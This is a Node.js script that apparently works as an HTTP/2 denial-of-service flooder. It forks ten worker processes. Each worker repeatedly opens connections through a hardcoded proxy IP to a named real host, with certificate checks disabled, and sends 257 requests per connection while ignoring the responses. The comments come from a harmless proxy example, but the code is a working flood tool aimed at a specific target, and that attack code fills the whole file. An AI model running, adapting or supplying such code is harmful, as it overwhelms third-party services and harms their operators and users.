const http = require('http');
const http2 = require('http2');

const cluster = require("cluster");
const {constants} = require("crypto");

if (cluster.isMaster) {
    for (var i = 0; i < 10; i++) {
        cluster.fork();
        console.log(`${i + 1} Thread Started`);
    }
    setTimeout(() => {
        process.exit(1);
    }, 10000 * 1000);
} else {
    require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
    process.on('uncaughtException', function (er) {
        console.error(er)
    });
    process.on('unhandledRejection', function (er) {
        console.error(er)
    });
    const {constants} = require("crypto");
    /**
     * A URL without the path.
     */
    const TARGET_AUTHOTIRY = 'https://eu26.tkcdns.com'

    /**
     * You should use the host with the port equivalent to the protocol
     * HTTP => 80
     * HTTPS => 443
     */
    const TARGET_HOST = 'eu26.tkcdns.com'

    /**
     * Proxy configuration
     */
    const PROXY_HOST = '154.16.180.182'
    const PROXY_PORT = '3128'


    /**
     * Establishes an connection to the target server throught the HTTP/1.0
     * proxy server.
     *
     * The CONNECT method tells the PROXY server where this connection should arive.
     *
     * After the connection is established you will be able to use the TCP socket to send data
     * to the TARGET server.
     */
    setInterval(() => {
        const request = http.request({
            method: 'CONNECT',
            host: PROXY_HOST,
            port: PROXY_PORT,
            path: TARGET_HOST,
            headers: {
                'Host': TARGET_HOST,
            }
        })

        /**
         * Wait the "connect" event and then uses the TCP socket to proxy the HTTP/2.0 connection throught.
         */
        request.on('connect', (res, socket) => {
            /**
             * Check if it has successfully connected to the server
             */
            if (res.statusCode !== 200)
                throw new Error('Connection rejected by the proxy')

            /**
             * Use the TCP socket from the HTTP/1.0 as the socket for this new connection
             * without the need to establish the TLS connection manually and handle the errors
             * manually too.
             *
             * This method accepts all TCP and TLS options.
             */
            const client = http2.connect(TARGET_AUTHOTIRY, {
                ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
                secureProtocol: ['TLSv1_2_method', 'TLSv1_3_method', 'SSL_OP_NO_SSLv3', 'SSL_OP_NO_SSLv2'],
                secure: true,
                requestCert: true,
                honorCipherOrder: true,
                secureOptions: constants.SSL_OP_NO_SSLv3,
                rejectUnauthorized: false,
                socket: socket })

            client.on('connect', () => {
                //console.log('Connected to the page!')
            })

            /**
             * Request to check your IP
             */
            for (let j = 0; j < 256; j++) {
                client.request({
                    ':path': '/',})
            }
            const req = client.request({
                ':path': '/',
            })

            req.on('response', (headers) => {
                //console.log('Recieved a response')
            })

            /**
             * Stores the data recieved as a response
             */
            const buffers = []
            req.on('data', (buffer) => {
                //buffers.push(buffer)
            })

            req.on('end', () => {
                //console.log(Buffer.concat(buffers).toString('utf-8'))

                // Closes the connection with the server
                client.close()
            })

            req.end()
        })

        request.end()})
}

